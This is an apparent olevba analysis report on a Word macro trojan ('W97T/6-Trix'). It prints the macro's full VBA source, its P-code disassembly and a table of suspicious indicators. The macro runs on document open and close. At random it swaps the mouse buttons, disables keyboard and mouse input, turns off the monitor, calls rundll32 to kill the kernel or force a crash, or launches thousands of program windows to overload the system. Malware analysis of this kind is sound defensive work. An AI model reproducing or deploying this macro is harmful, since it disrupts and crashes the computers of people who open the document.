olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Trojan.MSWord.Trix
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: ./Trojan.MSWord.Trix - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Module1.bas 
in file: ./Trojan.MSWord.Trix - OLE stream: 'Macros/VBA/Module1'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
'W97T/6-Trix by Error and Hash from TN
'-----------simply for fun----------
'          Warning you now:
' This is a nasty but SIMPLE trojan
'-----------------------------------
Private Declare Function SendMessage Lib "user32" Alias "SendMessageA" _
    (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, _
    ByVal lParam As Long) As Long
    Private Const WM_SYSCOMMAND = &H112&
    Private Const SC_MONITORPOWER = &HF170&

Sub AutoOpen()
Call Nukeit
End Sub
Sub AutoClose()
Call Nukeit
End Sub
Function Nukeit()
Randomize Timer
x = Int(Rnd(1) * 5) + 1
If x = 1 Then
    'Are you Ambidexterous?
    Shell "rundll32 user,swapmousebutton"
End If
If x = 2 Then
    'Try typing without a keyboard...and a mouse
    Shell "rundll32 keyboard,disable"
    Shell "rundll32 mouse,disable"
End If
If x = 3 Then
    'WTF happened to my screen!!!
    Dim Ret As Long
    Ret = SendMessage(-1, WM_SYSCOMMAND, SC_MONITORPOWER, 0&)
End If
If x = 4 Then
    'Where did windows Go?!
    Shell "rundll32 krnl386.exe,exitkernel"
End If
If x = 5 Then
    'Blue screen of DEATH!!!
    Shell "rundll32 user,disableoemlayer"
End If
If x = 6 Then
    Do While z <> 1000
    'Overload windows!!
        s = Shell("notepad.exe", vbNormalFocus)
        s = Shell("ping.exe", vbNormalFocus)
        s = Shell("tracert.exe", vbNormalFocus)
        s = Shell("calc.exe", vbNormalFocus)
        s = Shell("charmap.exe", vbNormalFocus)
        s = Shell("pbrush.exe", vbNormalFocus)
        s = Shell("write.exe", vbNormalFocus)
        z = z + 1
    Loop
End If
End Function
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: ./Trojan.MSWord.Trix
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 9343 bytes
' Macros/VBA/Module1 - 3962 bytes
' Line #0:
' 	QuoteRem 0x0000 0x0025 "W97T/6-Trix by Error and Hash from TN"
' Line #1:
' 	QuoteRem 0x0000 0x0023 "-----------simply for fun----------"
' Line #2:
' 	QuoteRem 0x0000 0x001A "          Warning you now:"
' Line #3:
' 	QuoteRem 0x0000 0x0022 " This is a nasty but SIMPLE trojan"
' Line #4:
' 	QuoteRem 0x0000 0x0023 "-----------------------------------"
' Line #5:
' 	LineCont 0x0008 08 00 04 00 18 00 04 00
' 	FuncDefn (Private Declare Function SendMessage Lib "user32" (ByVal hWnd As Long, ByVal wMsg As Long, ByVal wParam As Long, ByVal lParam As Long) As Long)
' Line #6:
' 	Dim (Private Const) 
' 	LitHI4 0x0112 0x0000 
' 	VarDefn WM_SYSCOMMAND
' Line #7:
' 	Dim (Private Const) 
' 	LitHI4 0xF170 0x0000 
' 	VarDefn SC_MONITORPOWER
' Line #8:
' Line #9:
' 	FuncDefn (Sub AutoOpen())
' Line #10:
' 	ArgsCall (Call) Nukeit 0x0000 
' Line #11:
' 	EndSub 
' Line #12:
' 	FuncDefn (Sub AutoClose())
' Line #13:
' 	ArgsCall (Call) Nukeit 0x0000 
' Line #14:
' 	EndSub 
' Line #15:
' 	FuncDefn (Function Nukeit())
' Line #16:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #17:
' 	LitDI2 0x0001 
' 	ArgsLd Rnd 0x0001 
' 	LitDI2 0x0005 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St x 
' Line #18:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #19:
' 	QuoteRem 0x0004 0x0016 "Are you Ambidexterous?"
' Line #20:
' 	LitStr 0x001D "rundll32 user,swapmousebutton"
' 	ArgsCall Shell 0x0001 
' Line #21:
' 	EndIfBlock 
' Line #22:
' 	Ld x 
' 	LitDI2 0x0002 
' 	Eq 
' 	IfBlock 
' Line #23:
' 	QuoteRem 0x0004 0x002B "Try typing without a keyboard...and a mouse"
' Line #24:
' 	LitStr 0x0019 "rundll32 keyboard,disable"
' 	ArgsCall Shell 0x0001 
' Line #25:
' 	LitStr 0x0016 "rundll32 mouse,disable"
' 	ArgsCall Shell 0x0001 
' Line #26:
' 	EndIfBlock 
' Line #27:
' 	Ld x 
' 	LitDI2 0x0003 
' 	Eq 
' 	IfBlock 
' Line #28:
' 	QuoteRem 0x0004 0x001C "WTF happened to my screen!!!"
' Line #29:
' 	Dim 
' 	VarDefn Ret (As Long)
' Line #30:
' 	LitDI2 0x0001 
' 	UMi 
' 	Ld WM_SYSCOMMAND 
' 	Ld SC_MONITORPOWER 
' 	LitDI4 0x0000 0x0000 
' 	ArgsLd SendMessage 0x0004 
' 	St Ret 
' Line #31:
' 	EndIfBlock 
' Line #32:
' 	Ld x 
' 	LitDI2 0x0004 
' 	Eq 
' 	IfBlock 
' Line #33:
' 	QuoteRem 0x0004 0x0016 "Where did windows Go?!"
' Line #34:
' 	LitStr 0x001F "rundll32 krnl386.exe,exitkernel"
' 	ArgsCall Shell 0x0001 
' Line #35:
' 	EndIfBlock 
' Line #36:
' 	Ld x 
' 	LitDI2 0x0005 
' 	Eq 
' 	IfBlock 
' Line #37:
' 	QuoteRem 0x0004 0x0017 "Blue screen of DEATH!!!"
' Line #38:
' 	LitStr 0x001D "rundll32 user,disableoemlayer"
' 	ArgsCall Shell 0x0001 
' Line #39:
' 	EndIfBlock 
' Line #40:
' 	Ld x 
' 	LitDI2 0x0006 
' 	Eq 
' 	IfBlock 
' Line #41:
' 	Ld z 
' 	LitDI2 0x03E8 
' 	Ne 
' 	DoWhile 
' Line #42:
' 	QuoteRem 0x0004 0x0012 "Overload windows!!"
' Line #43:
' 	LitStr 0x000B "notepad.exe"
' 	Ld vbNormalFocus 
' 	ArgsLd Shell 0x0002 
' 	St s 
' Line #44:
' 	LitStr 0x0008 "ping.exe"
' 	Ld vbNormalFocus 
' 	ArgsLd Shell 0x0002 
' 	St s 
' Line #45:
' 	LitStr 0x000B "tracert.exe"
' 	Ld vbNormalFocus 
' 	ArgsLd Shell 0x0002 
' 	St s 
' Line #46:
' 	LitStr 0x0008 "calc.exe"
' 	Ld vbNormalFocus 
' 	ArgsLd Shell 0x0002 
' 	St s 
' Line #47:
' 	LitStr 0x000B "charmap.exe"
' 	Ld vbNormalFocus 
' 	ArgsLd Shell 0x0002 
' 	St s 
' Line #48:
' 	LitStr 0x000A "pbrush.exe"
' 	Ld vbNormalFocus 
' 	ArgsLd Shell 0x0002 
' 	St s 
' Line #49:
' 	LitStr 0x0009 "write.exe"
' 	Ld vbNormalFocus 
' 	ArgsLd Shell 0x0002 
' 	St s 
' Line #50:
' 	Ld z 
' 	LitDI2 0x0001 
' 	Add 
' 	St z 
' Line #51:
' 	Loop 
' Line #52:
' 	EndIfBlock 
' Line #53:
' 	EndFunc 
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|write               |May write to a file (if combined with Open)  |
|Suspicious|Shell               |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|vbNormalFocus       |May run an executable file or a system       |
|          |                    |command                                      |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|windows             |May enumerate application windows (if        |
|          |                    |combined with Shell.Application object)      |
|Suspicious|Lib                 |May run code from a DLL                      |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|IOC       |krnl386.exe         |Executable file name                         |
|IOC       |notepad.exe         |Executable file name                         |
|IOC       |ping.exe            |Executable file name                         |
|IOC       |tracert.exe         |Executable file name                         |
|IOC       |calc.exe            |Executable file name                         |
|IOC       |charmap.exe         |Executable file name                         |
|IOC       |pbrush.exe          |Executable file name                         |
|IOC       |write.exe           |Executable file name                         |
|Suspicious|VBA Stomping        |VBA Stomping was detected: the VBA source    |
|          |                    |code and P-code are different, this may have |
|          |                    |been used to hide malicious code             |
+----------+--------------------+---------------------------------------------+
VBA Stomping detection is experimental: please report any false positive/negative at https://github.com/decalage2/oletools/issues

